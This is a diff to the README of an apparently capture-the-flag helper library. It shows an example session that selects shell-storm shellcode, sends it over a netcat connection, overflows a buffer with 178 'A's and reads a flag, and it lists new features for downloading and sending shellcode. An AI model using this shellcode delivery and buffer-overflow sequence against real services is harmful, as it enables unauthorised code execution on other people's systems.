@@ -41,14 +41,14 @@ Port 4444: GIVE ME SHELLCODZ
 Selection: 86
 You chosed http://shell-storm.org/shellcode/files/shellcode-752.php
 Shellcode: "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62[...]"
->>> nc.writeln(shell_code, shellcode=True)
+>>> nc.shellcat(shell_code)
 >>> nc.writeln("A"*178)
 >>> exploit = nc.dialogue("cat flag", 3)
 >>> print(exploit)
 File name too long
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAflag{EasyPe4syL3m0nSq33zy}!!
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAflag{EasyPe4syL3m0nSq33zy!!}
 ```
 ##Implemented:    
 * Crypto    
@@ -60,8 +60,9 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAflag{EasyPe4syL3m0nSq33zy}!!
     * RSA basics (inverse modulo, inverse power, egcd...)    
 
 * Shellcodes    
-    * Shellcode selection    
-    * Shellcode format from Shell-storm repo    
+    * Shellcode selection and download from Shell-storm repo    
+    * Shellcode formater 
+    * Shell{cat,net}: Sending shellcode made easy
 
 * Easy connection support    
     * Netcat    
